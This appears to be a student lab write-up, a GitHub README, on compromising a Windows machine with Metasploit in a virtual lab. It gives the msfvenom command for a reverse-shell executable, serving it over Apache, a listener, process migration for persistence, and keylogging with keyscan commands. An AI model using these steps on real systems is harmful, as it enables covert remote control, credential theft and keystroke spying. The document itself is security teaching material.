# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By :Yashaswini S

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="955" height="1045" alt="ifco" src="https://github.com/user-attachments/assets/7978fabb-e001-478d-b329-695eeffe95d1" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
<img width="1920" height="1057" alt="sudo" src="https://github.com/user-attachments/assets/e1853a19-878b-4374-aebc-2f01955e470f" />



copy the fun.exe into the apache ```/var/www/html ```folder
<img width="597" height="107" alt="Screenshot 2025-09-29 092520" src="https://github.com/user-attachments/assets/756fb169-3f0b-4d4f-b7fb-c2d9688651db" />



Start apache server ```sudo systemctl apache2 start``` 

<img width="579" height="121" alt="Screenshot 2025-09-29 092856" src="https://github.com/user-attachments/assets/4ec4a5de-a5eb-42fb-9062-d89b5cee487d" />


Check the status of apache2 ```sudo apache2 status```

<img width="778" height="334" alt="Screenshot 2025-09-29 093317" src="https://github.com/user-attachments/assets/8114d00d-7a54-40ef-ad7c-df207ed86db1" />

Invoke msfconsole:
## OUTPUT:
<img width="1920" height="1057" alt="mss" src="https://github.com/user-attachments/assets/16907584-d063-4347-a78f-567d5dfb7334" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
<img width="742" height="546" alt="Screenshot 2025-09-29 093517" src="https://github.com/user-attachments/assets/faefee01-9289-4980-828b-b61ac4446e44" />

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="1920" height="1057" alt="VirtualBox_kali_29_09_2025_09_37_36" src="https://github.com/user-attachments/assets/c1868447-a390-41be-8527-2a4ce706f0b1" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

<img width="767" height="355" alt="Screenshot 2025-09-29 093819" src="https://github.com/user-attachments/assets/55fd65cb-0bd4-46f4-bf0a-d0a37b155b24" />


Bypass any warning boxes, double-click the file, and allow it to run.
<img width="779" height="304" alt="Screenshot 2025-09-29 093857" src="https://github.com/user-attachments/assets/94dc8119-21a4-4825-993f-d0a645f2be26" />

On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

<img width="772" height="574" alt="Screenshot 2025-09-29 094345" src="https://github.com/user-attachments/assets/604dea21-ec57-4dd6-8976-2d8917fb6a2d" />


keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

